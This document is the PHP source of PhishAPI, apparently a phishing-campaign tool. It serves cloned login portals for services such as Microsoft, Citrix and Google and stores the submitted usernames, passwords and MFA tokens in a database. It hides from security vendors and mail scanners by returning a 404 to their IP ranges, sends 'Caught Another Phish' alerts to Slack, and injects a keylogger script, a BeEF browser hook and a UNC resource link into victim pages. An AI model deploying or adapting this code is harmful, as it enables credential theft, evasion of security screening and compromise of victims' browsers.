<?php

// I recommend registering at ipinfo to hit the API a lot, in case of large traffic volumes
$ipinfoToken = "YOUR_IPINFO_TOKEN_HERE";

// Pulls in Required Connection Variables
ob_start();
require 'config/index.php';
ob_end_clean();

header("Access-Control-Allow-Origin: *");

$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

$url = rtrim($url, '/');

// See if requested URI is a match
if (strpos($url, $APIDomain) !== false) {
    $URLMatch = 1;
} else {$URLMatch = 0;}

// This part auto-blocks anyone accessing the site by IP only
$parts = parse_url($url);
$isIP = (bool)ip2long($parts['host']);

$allowed = "- *Accessed API Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];
// Uncomment if you want to see what the site looks like as Google
//$ip = "8.8.8.8";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json?token={$ipinfoToken}"));
$org = $details->org;

// List of Orgs to be Blacklisted
$blockorgs = array("1337 Services GmbH","31173 Services AB","321net","A1 Telekom Austria AG","A2B IP B.V.","Ace Host, LLC","AEZA GROUP Ltd","Afrihost","Aggros Operations Ltd.","Akamai Connected Cloud","ALGAR TELECOM S/A","Alibaba","Alibaba (US) Technology Co., Ltd.","Allstream","Alsycon B.V.","Amazon","Amazon.com, Inc.","Andrei Tiberiu Holt","ANJANI BROADBAND SOLUTIONS PVT.LTD.","AOFEI DATA INTERNATIONAL COMPANY LIMITED","Apple Inc.","ARABIAN INTERNET & COMMUNICATIONS SERVICES CO.LTD","Artnet Sp. z o.o.","Asahi Net","AT&T Services, Inc.","AVAST","AVAST Software s.r.o.","B2 Net Solutions Inc.","Beijing","Bell Canada","Berhad","Bharti Airtel Ltd., Telemedia Services","Bhwani Cable and Broadband Services","Bitdefender SRL","BKTech","BL Networks","Blix Solutions AS","Bouygues Telecom SA","BRASIL S.A","CariNet","CariNet, Inc.","CDS Global Cloud Co., Ltd","Cellcom Fixed Line Communication L.P","Censys, Inc.","CenturyLink Communications, LLC","China Mobile communications corporation","China Mobile Communications Group Co., Ltd.","China Telecom","China Telecom (Group)","China Unicom  IP network China169 Guangdong province","CHINA UNICOM China169 Backbone","China Unicom Guangdong IP network","China Unicom IP network","China Unicom Shanghai network","CHINANET","CHINANET Guangdong province network","CHINANET-BACKBONE","CHINATELECOM Guangxi Nanning IDC networkdescr: Nanning , Guangxi Province, P.R.China.","Cisco Systems Ironport Division","Cloudflare, Inc.","Clouvider","Cogent Communications","ColoCrossing","Commtouch Inc.","Contabo","Contabo GmbH","Core-Backbone GmbH","Corporación Dana S.A.","Cox Communications Inc.","Crown Castle Fiber LLC","CS LOXINFO PUBLIC COMPANY LIMITED","CT-SHANXI-MAN-2","Cyber_Folks SRL","Data Center Experts LTD","Data Communication Business Group","Datacamp Limited","DataClub S.A.","DataHata","DediPath","DigitalOcean","DigitalOcean, LLC","Dino Solutions, Inc.","EDINAYA SET LIMITED LIABILITY COMPANY","EGIHosting","Emerald Onion","Emsisoft","EstNOC OY","Excitel Broadband Private Limited","F3 Netze e.V.","Facebook, Inc.","Faction","FastNet","Fastweb","Ferdinand Zink trading as Tube","Ferdinand Zink trading as Tube-Hosting","Flokinet Ltd","Forcepoint","Forcepoint, LLC","Foreningen for digitala fri- och rattigheter","Fortinet","Foundation for Applied Privacy","FPT Telecom Company","FranTech Solutions","Free SAS","Free Technologies","Frontier Communications of America, Inc.","G-Core Labs S.A.","Geekyworks IT Solutions Pvt Ltd","GEMNET LLC","GHOSTnet","GigeNET","GleSYS AB","GLOBAL COLOCATION LIMITED","Globalhost d.o.o","GMO Internet,Inc","GoDaddy","Google LLC","GREEN FLOID LLC","GSL Networks Pty LTD","GTHost","GTT Communications Inc.","Guanghuan Xinwang","H4Y Technologies LLC","H88 WEB HOSTING S.R.L.","HangZhou","Hathway IP Over Cable Internet","Henan Mobile Communications Co.,Ltd","Hetzner","Hetzner Online GmbH","HIVELOCITY","Hivelocity Inc","Host Universal Pty Ltd","HostPapa","HostRoyale","HostRoyale Technologies Pvt Ltd","Hostwinds LLC.","HQDATA","Huawei","Huawei Cloud Service data center","Hurricane Electric","Hurricane Electric LLC","Hyonix LLC","i3D.net B.V","IDC, China Telecommunications Corporation","INCX Global, LLC","Innsbrucker Kommunalbetriebe AG","Intelligence Network Online, Inc.","Internap","Internet Archive","INTERNET MEASUREMENT","Internet Utilities Europe and Asia Limited","Internet Vikings International AB","INVITE Systems SRL","IONOS SE","IP Volume","IP Volume inc","IPAX","IPXO LIMITED","ISP4Life INC","iWeb Technologies Inc.","JSC \"ER-Telecom Holding\"","Kamatera, Inc.","Kansas Fiber Network, LLC","Kaspersky","Kaspersky Lab Switzerland GmbH","KeFF Networks Ltd","Kejizhongyi","Keliweb S.R.L","Korea Telecom","Labitat","Lantek LLC","Latitude.sh","Leaseweb Asia Pacific pte. ltd.","Leaseweb Deutschland GmbH","Leaseweb USA, Inc.","Level 3 Parent, LLC","Limestone Networks, Inc.","Linode","LINZ STROM GAS WAERME GmbH fuer Energiedienstleistungen und Telekommunikation","LLC Digital Network","Login, Inc.","M247","M247 Europe SRL","Markus","Massachusetts Institute of Technology","McAfee","Merit Network","Microsoft","Microsoft Corporation","Mimecast","MivoCloud SRL","My Tech BZ","myLoc managed IT AG","net4sec UG","Netcraft","Netplus Broadband Services Private Limited","networksdelmanana.com","Nexeon Technologies, Inc.","Nexlogic Telecommunications Network, Inc.","NForce Entertainment","Norton","Obenetwork AB","Office National des Postes et Telecommunications","ONLINE S.A.S.","Optimum WiFi","Optisprint","Oracle Corporation","Orange Polska Spolka Akcyjna","Orion Network Limited","OVH SAS","Owl Limited","Packet Exchange","Packet Exchange Limited","PALO ALTO","PALO ALTO NETWORKS","PEG TECH INC","Performive LLC","Pfcloud UG","Plusnet","Pogliotti","Powerhouse Management","Powerhouse Management, Inc.","Private Layer INC","PrivateSystems Networks","Proservice LLC","Psychz Networks","PT Indonesia Comnets Plus","PT Telekomunikasi Indonesia","Qinghai Telecom","Quad9","QuadraNet","QuadraNet Enterprises LLC","QUALYS, Inc.","QuickPacket, LLC","Rackspace","RCS & RDS SA","Red Byte LLC","ReliableSite.Net LLC","Rethem Hosting LLC","RIPE","RouterHosting LLC","RWTH Aachen University","SAKURA Internet Inc.","Sapinet SAS","Scalair SAS","SCALEWAY S.A.S.","Selectel","SEMrush CY LTD","Servers Australia Customers","Shenzhen Tencent Computer Systems Company Limited","Sia Nano IT","SIA VEESP","Sichuan Chuanxn IDC","SIMBANET","Sistemas Informaticos, S.A.","SK Broadband Co Ltd","SkyLink Data Center BV","Skyway West","Smart Technology LLC","SoftLayer Technologies","Spectre Operations","Squarespace, Inc.","SS-Net","Stanford University","Stiftung Erneuerbare Freiheit","Strong Technology, LLC.","Sundance International LLC","SunGard","SunValley New Oriental","SWIFT ONLINE BORDER","Tahoe Internet Exchange (TahoeIX)","TalkTalk Communications","TalkTalk Communications Limited","Tamatiya EOOD","Tech Futures Interactive Inc.","TEFINCOM S.A.","TeleData GmbH","TELEFONICA DE ESPANA S.A.U.","Telefonica del Peru","Telefonica UK Limited","Tencent Building, Kejizhongyi Avenue","TerraHost AS","TerraTransit AG","The Communication Authoity of Thailand, CAT","The Constant Company, LLC","Tier.Net Technologies LLC","TOTAL PLAY TELECOMUNICACIONES SA DE CV","Total Server","trafficforce, UAB","tzulo, inc.","UCLOUD INFORMATION TECHNOLOGY (HK)","UK Dedicated Servers Limited","Universo Online S.A.","VegasNAP, LLC","VeriSign Infrastructure & Operations","Verizon","Verizon Business","Viettel Group","Vimpelcom","Virtual Systems LLC","Visual Trading Systems, LLC","VIVID-HOSTING LLC","Vodafone GmbH","VolumeDrive","Voxility LLP","Wana Corporate","Web2Objects","Web2Objects LLC","WEB3 Leaders INC","Webline Services Inc","WestHost","WhiteLabelColo","Wholesale Services Provider","Wintek Corporation","YANDEX LLC","YISP","Zayo Bandwidth","Zemlyaniy Dmitro Leonidovich","Zenlayer","Zenlayer Inc","ZSCALER","Zwiebelfreunde e.V.","T-Mobile USA, Inc.","Ritter Communications","Colocation America Corporation","Telia Finland Oyj","Closeness S.L.","Virgin Media Limited","Keminet SHPK","QuxLabs AB","BrainStorm Network, Inc","Afrihost (Pty) Ltd");

//if (strpos($url, $APIDomain) !== false) {
//    echo 'true';
//}



//block via blacklist

// UNCOMMENT AND ADD YOUR IP TO WHITELIST ONLY YOU BEFORE STARTING, THEN SWITCH COMMENTS TO ALLOW ALL BUT BLACKLIST
//if($ip != "YOUR_WORKSTATIONS_PUBLIC_IP_HERE") {
if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true OR $URLMatch == 0) {

$blocked = 1;
if($isIP == true){$blocked = 2;}
if($URLMatch == 0){$blocked = 3;}

// Content for Orgs to see on the Blacklist
//echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {

// Receives Required Parameters and Sets Variables
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_REQUEST['username'])){$user = $_REQUEST['username'];}else{$user = "";}
if(isset($_REQUEST['password'])){$pass = base64_encode($_REQUEST['password']);}else{$pass = "";}
if(isset($_REQUEST['extra'])){$extra = $_REQUEST['extra'];}else{$extra = "";}
if(isset($_REQUEST['project'])){$portal = $_REQUEST['project'];}else{$portal = "";}
if(isset($_REQUEST['redirect'])){$redirect = $_REQUEST['redirect'];}else{$redirect = "";}

// Receives Optional Parameters and Overrides Variables
if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}else{$slackemoji = ":fishing_pole_and_fish:";}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}else{$slackbotname = "PhishBot";}

// This code retrieves the csrf token if provided
if(isset($_REQUEST['csrftoken']) && $_REQUEST['csrftoken'] != ""){
	$csrftoken = $_REQUEST['csrftoken'];
	$redirurl = $_REQUEST['redirurl'];
	
$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => $redirurl,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_HTTPHEADER => array(
    "cache-control: no-cache",
    "user-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" // Here we add the header
  ),

));


$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

if ($err) {
  echo "cURL Error #:" . $err;
} else {
//  echo $response;
}



$arr = explode("\n", $response); 
  


$matchingvalue = 'name="'.$csrftoken.'"';


$content_before_string = strstr($response, $matchingvalue, true);

if (false !== $content_before_string) {
    $line = count(explode(PHP_EOL, $content_before_string));
	$line = $line - 1;
    $tokenline = $arr[$line];
}



function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

$csrfvalue = get_string_between($tokenline, 'value="', '"');

echo $csrfvalue;

	
}

// Makes Password Safe for DB
$user = stripslashes($user);

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Writes User and Password to a Local Log (In Case DB Insert Fails)
$myfile = fopen("/tmp/APIPhishingLogs.txt", "a") or die("Unable to open file!");
$txt = $user." ".$pass."\n\r\n\r";
fwrite($myfile, "\n". $txt);
fclose($myfile);

// Checks Trophy Awards
$sqltrophy = "CALL GetAwards('$portal','$user');";
$resulttrophy = $conn->query($sqltrophy);

while($row = $resulttrophy->fetch_assoc()) {

if($row["Title"] == "MostDedicated"){
$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
//exec($cmdtrophy);
}


if($row["Title"] == "MostDelayed"){
$cmdtrophy2 = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
//exec($cmdtrophy2);
}

if($row["Title"] == "MostDisclosedPWs"){
$cmdtrophy3 = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
//exec($cmdtrophy3);
}


if($row["Title"] == "MostPhish"){
$cmdtrophy4 = "curl -F file=@awardgifs/TrophyMostPhish.gif -F 'initial_comment=Gonna need a bigger boat.. ".$row["username"]." phish! - ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
//exec($cmdtrophy4);
}

}

printf($conn->error);
$conn->close();

if($pass != ""){

$conn2 = mysqli_connect($servername, $username, $password, $dbname);

// Inserts Captured Information Into MySQL DB
$sql = "CALL InsertStolenCreds('$user','$pass','$ip','$portal','$MFAToken','$extra');";
//echo $sql;
$result = $conn2->query($sql);

printf($conn2->error);
$conn2->close();

}
}

?>

<?php if(isset($_REQUEST['fakesite'])){ ?>

<!-- INSERT PRE-POPULATED LOGON FORM OPTIONS HERE -->
<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="main.css">
<style>
textarea {
  width: 600px;
  height: 350px;
}
</style>
<TITLE>PhishAPI</TITLE>
<link rel="apple-touch-icon" sizes="57x57" href="images/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="images/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="images/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="images/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="images/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="images/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="images/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="images/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="images/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="images/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="images/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="images/favicon/favicon-16x16.png">
<link rel="manifest" href="images/favicon/manifest.json">
<link rel="stylesheet" href="w3.css">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="images/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
</HEAD>
<BODY>
<FORM ACTION="index.php" METHOD="GET">
  <div class="w3-dropdown-hover w3-right">
    <button class="w3-button w3-phishapi"><i class="fa fa-home fa-2x" aria-hidden="true" style="color: black;"></i> Home</button>
    <div class="w3-dropdown-content w3-bar-block w3-border" style="right:0">
      <a href="index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
      <a href="phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
      <a href="campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
	  <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
	  <a href="config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
    </div>
  </div></FORM><br><br>
<CENTER>
<BR>
<TABLE WIDTH="80%">
<FONT COLOR="#FFFFFF"><H1>Respository of Login Portals</H1><br></FONT>
<TR><TH WIDTH="100%" COLSPAN="3">Generic Portals</TH></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=generic1"><img src="templates/generic1portal.png" width="200"></a><br><br><b>Generic 1</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=generic2"><img src="templates/generic2portal.png" width="200"></a><br><br><b>Generic 2</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=generic3"><img src="templates/generic3portal.png" width="200"></a><br><br><b>Generic 3</b></TD></TR>
<TR><TH WIDTH="100%" COLSPAN="3">Corporate Services</TH></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=citrix"><img src="templates/citrixportal.png" width="200"></a><br><br><b>Citrix</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=microsoft"><img src="templates/microsoftportal.png" width="200"></a><br><br><b>Microsoft</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=anyconnect"><img src="templates/anyconnectportal.png" width="200"></a><br><br><b>AnyConnect</b></TD></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=owa"><img src="templates/owaportal.png" width="200"></a><br><br><b>OWA</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=owagray"><img src="templates/owaportalgray.png" width="200"></a><br><br><b>OWA (Gray)</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=citrix2"><img src="templates/citrix2.png" width="200"></a><br><br><b>Citrix 2</b></TD></TR>
<TR><TH WIDTH="100%" COLSPAN="3">Social Media / Third Party Sites</TH></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=instagram"><img src="templates/instagramportal.png" width="200"></a><br><br><b>Instagram</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=wordpress"><img src="templates/wordpressportal.png" width="200"></a><br><br><b>WordPress</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=google"><img src="templates/googleportal.png" width="200"></a><br><br><b>Google</b></TD></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=facebook"><img src="templates/facebookportal.png" width="200"></a><br><br><b>Facebook</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=linkedin"><img src="templates/linkedinportal.png" width="200"></a><br><br><b>LinkedIn</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=twitter"><img src="templates/twitterportal.png" width="200"></a><br><br><b>Twitter</b></TD></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=fedex"><img src="templates/fedexportal.png" width="200"></a><br><br><b>FedEx</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=ups"><img src="templates/upsportal.png" width="200"></a><br><br><b>UPS</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=usps"><img src="templates/uspsportal.png" width="200"></a><br><br><b>USPS</b></TD></TR>
</TABLE>
<BR><FONT COLOR="#FFFFFF" SIZE="3">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
<BR><BR>
<FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use Your Own HTML and Embed the API Tags</FONT><BR><BR>
<textarea style="text-align:left" class="js-emaillink">
<!--Add the external script source in the <head> element-->
<script src="<?php echo $APIDomain;?>/APICredentialFormSubmit.js"></script>

<!--Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments-->
<buttom value="Submit!" onclick="SubForm('https://<?php echo $APIDomain;?>,'NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">

<!--
PhishAPI_URL_HERE = https://<?php echo $APIDomain;?> (wherever you're hosting the API)

NAME/ID_OF_LOGIN_FORM = Whatever the cloned <form name=""> is set to for the page you cloned

PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)

SLACK_BOT_NAME = I use "PhishBot"

SLACK_EMOJI = I use :fishing_pole_and_fish:

USER_FIELD_NAME/ID = Name or ID of the username/email field (<input name="username"> or <input id="user">)

PASS_FIELD_NAME/ID = Name or ID of the password field (<input name="password"> or <input id="pass">)

SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)

CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token. If so provide the Name/ID here (<input type="hidden" name="csrf_token" value="XDLKJSDLKJLDKJDLKJFSLKLSF"> so "csrf_token" is what you would use)
-->
</textarea>
<p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>

<script>
var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
copyEmailBtn.addEventListener('click', function(event) {  
  // Select the email link anchor text  
  var emailLink = document.querySelector('.js-emaillink');  
  var range = document.createRange();  
  range.selectNode(emailLink);  
  window.getSelection().addRange(range);  

  try {  
    // Now that we've selected the anchor text, execute the copy command  
    var successful = document.execCommand('copy');  
    var msg = successful ? 'successful' : 'unsuccessful';  
    console.log('Copy email command was ' + msg);  
  } catch(err) {  
    console.log('Oops, unable to copy');  
  }  

  // Remove the selections - NOTE: Should use
  // removeRange(range) when it is supported  
  window.getSelection().removeAllRanges();  
});
</script>
</CENTER>
</BODY>
</HTML>

<?php } else {

if($redirect == false && !isset($redirurl)){ ?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="main.css">
<link rel="stylesheet" href="w3.css">
<TITLE>PhishAPI</TITLE>
<link rel="apple-touch-icon" sizes="57x57" href="images/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="images/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="images/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="images/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="images/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="images/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="images/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="images/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="images/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="images/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="images/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="images/favicon/favicon-16x16.png">
<link rel="manifest" href="images/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="images/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
</HEAD>
<BODY>
<FORM ACTION="index.php" METHOD="GET">
  <div class="w3-dropdown-hover w3-right">
    <button class="w3-button w3-phishapi"><i class="fa fa-home fa-2x" aria-hidden="true" style="color: black;"></i> Home</button>
    <div class="w3-dropdown-content w3-bar-block w3-border" style="right:0">
      <a href="index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
      <a href="phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
      <a href="campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
	  <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
	  <a href="config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
    </div>
  </div></FORM><br><br>
<CENTER><FONT COLOR="#FFFFFF"><H1>Welcome to PhishAPI</H1>
<b><a href="config/"><b>Configure Notification Settings</b></a> and Then Choose an Option Below to Get Started!</b>
<BR><BR><BR>
<TABLE>
<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH><TH>Email Campaigns</TH></TR>
<TR><TD><a href="index.php?fakesite=1"><i class="fa fa-user fa-5X" aria-hidden="true" style="color: black;  font-size: 150px;"></i></a></TD><TD><a href="/phishingdocs/"><i class="fa fa-file-text fa-5X" aria-hidden="true"  style="color: black; font-size: 150px;"></a></TD><TD><a href="campaigns/"><i class="fa fa-envelope fa-5X" aria-hidden="true" style="color: black; font-size: 150px;"></i></a></TD></TR>
</TABLE>
</CENTER>

<!--
	Can comment out the above and uncomment below to avoid bots seeing the PhishAPI interface once you're ready
{"api_status":"healthy"}
	-->
</BODY>
</HTML>

<?php } }

$redirect = "";

if($redirect != ""){

// See if Redirect Location Allows Iframes
$cmdredir = 'curl -s "'.$redirect.'" -I | grep -Fi X-Frame-Options';

exec($cmdredir,$outputredir);

if(isset($outputredir[0])){
?>
<HTML>
<HEAD>
<meta http-equiv="refresh" content="0;URL='<?php echo $redirect; ?>'" />

</HEAD>
</BODY>

<?php }}

if($redirect != false){

if($outputredir[0] == false){ ?>
<HTML>
<HEAD>
<style>
body {
    margin: 0;
}
</style>
</HEAD>
<BODY>
<iframe src="<?php echo $redirect; ?>" width="100%" height="100%" frameborder="0" sandbox="allow-forms allow-scripts" scrolling="no"></iframe>
<script src="<?php echo $APIDomain;?>/kl.js" type="text/javascript"></script>
<?php } ?>

<image height="1" width="1" xlink:href="\\<?php echo $APIDomain;?>/resource.jpg" />

<!--<iframe src="unc.php" width="0" height="0" frameborder="0" sandbox="allow-forms allow-scripts"></iframe>-->

<script src="<?php echo $BeefHookJSURL;?>:3000/hook.js" type="text/javascript"></script>

</BODY>
</HTML>

<?php }


$slacklink = $APIDomain."/results/index.php?project=".urlencode($portal);

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Only Proceed if There is a Password
if($pass != ""){

// Judge Password Complexity
if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", base64_decode($pass))){
    $passstrength = ":thumbsup:";
} else {
    $passstrength = ":poop:";
}

// Checks HaveIBeenPwned DB
$sha1pass = strtoupper(sha1(base64_decode($pass)));

$cmd2 = 'curl -s -X GET "https://api.pwnedpasswords.com/range/'.substr($sha1pass, 0, 5).'"';

exec($cmd2);

// Executes the curl command
exec($cmd2,$pwned);

$pwnedarray = array();
$arraywithcount = array();

foreach($pwned as $pwned2){
$pos = strpos($pwned2, ":");
$shahash = substr($pwned2, 0, strrpos($pwned2, ':'));
$hashcount = substr($pwned2, $pos + 1);
$arraywithcount[$shahash] = $hashcount;
$pwnedarray[] = substr($pwned2, 0, strrpos($pwned2, ':'));
}

if (in_array(substr($sha1pass, 5), $pwnedarray)) {
    $TroyHunt = "yes";

$haveibeenpwnedhits = $arraywithcount[substr($sha1pass, 5)];

// Update DB w/ HIBP Data
$connhibp = mysqli_connect($servername, $username, $password, $dbname);

// Inserts Captured Information Into MySQL DB
$sqlhibp = "CALL UpdateHIBPCount('$pass','$portal','$haveibeenpwnedhits');";
$resulthibp = $connhibp->query($sqlhibp);

printf($connhibp->error);
$connhibp->close();

// If the Password is so non-unique, give a Trophy
if ($haveibeenpwnedhits >= "3000"){
$cmdtrophy5 = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. (".number_format($haveibeenpwnedhits)." times!) - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
//exec($cmdtrophy5);
}

} else $TroyHunt = "no";

// If the Password is Set, Change Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\\r\\n> Password Strength is ".$passstrength;

if($passstrength == ":poop:"){$pushstrength = "💩";}else{$pushstrength = "👌";}

$messagepush = "Caught Another Phish at ".$portal."!\\r\\nPassword Strength is ".$pushstrength;

$messagediscord = "> Caught Another Phish at ".$portal."! ([".$user."](".$slacklink."))\\n> Password Strength is ".$passstrength;

} else {

// If the Password is Not Set, Do Not Include Password Strength in Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";

$messagepush = "Caught Another Phish at ".$portal."!";

$messagediscord = "> Caught Another Phish at ".$portal."! (\[".$user."](".$slacklink."))";

}

